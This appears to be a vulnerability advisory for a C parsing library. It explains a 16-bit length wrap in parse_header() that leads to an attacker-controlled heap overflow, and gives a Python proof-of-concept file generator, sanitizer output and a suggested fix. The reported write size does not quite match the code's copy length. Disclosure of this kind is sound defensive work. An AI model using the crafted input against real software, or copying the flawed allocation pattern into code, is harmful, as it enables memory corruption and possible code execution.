# tinyparse 2.3.1: heap buffer overflow (write) in parse_header via u16 length wrap

## Summary

`parse_header()` in `src/header.c` allocates its copy buffer from a 16-bit length field, but copies using the 32-bit
length it computed from the same field plus a fixed prefix. For a declared length of `0xFFF0` or more, the allocation
size wraps to a tiny value while the `memcpy` still copies tens of kilobytes. The result is an attacker-controlled
heap write past the end of the allocation.

## Affected code

`src/header.c`, lines 61-74:

```c
uint16_t decl = read_u16(buf + 2);          /* attacker controlled */
uint16_t total = decl + HEADER_PREFIX;      /* HEADER_PREFIX == 24, wraps at 0xFFE8 */
uint8_t *dst = malloc(total);               /* tiny allocation when decl >= 0xFFE8 */
size_t copy_len = (size_t)decl + HEADER_PREFIX;  /* does NOT wrap */
memcpy(dst, buf + 4, copy_len);             /* writes copy_len bytes into a `total`-byte block */
```

## Reproduction

Tested on tinyparse 2.3.1 built with `-fsanitize=address`, x86-64 Linux.

```sh
git clone https://example.invalid/tinyparse && cd tinyparse && git checkout v2.3.1
make CFLAGS="-fsanitize=address -g" demo
python3 -c "
import struct, sys
body = b'A' * 70000
sys.stdout.buffer.write(b'TP' + struct.pack('<H', 0xFFF0) + body)
" > poc.bin
./demo poc.bin
```

Observed output:

```
==4121==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000eff8
WRITE of size 65520 at 0x60200000eff8 thread T0
    #0 memcpy
    #1 parse_header src/header.c:73
    #2 main demo.c:19
0x60200000eff8 is located 0 bytes after 8-byte region [0x60200000eff0,0x60200000eff8)
allocated by thread T0 here:
    #1 parse_header src/header.c:70
```

The allocation is 8 bytes (`0xFFF0 + 24` wraps to `0x0008`); the write is 65,520 bytes. The overflowing bytes are
fully attacker controlled (they are the file body), so this is an arbitrary-content heap write, which is the standard
starting point for remote code execution in any program that parses untrusted files with tinyparse.

## Root cause

The size used for allocation (`total`, `uint16_t`) and the size used for copying (`copy_len`, `size_t`) are computed
separately from the same untrusted field. The 16-bit sum wraps; the 64-bit sum does not.

## Impact

Out-of-bounds heap write with attacker-controlled content and length from a single crafted file. Any application that
opens untrusted input with `tp_open()` is exposed.

## Suggested fix

Compute one `size_t total = (size_t)decl + HEADER_PREFIX;`, allocate and copy with that same value, and reject
`decl > MAX_HEADER`.
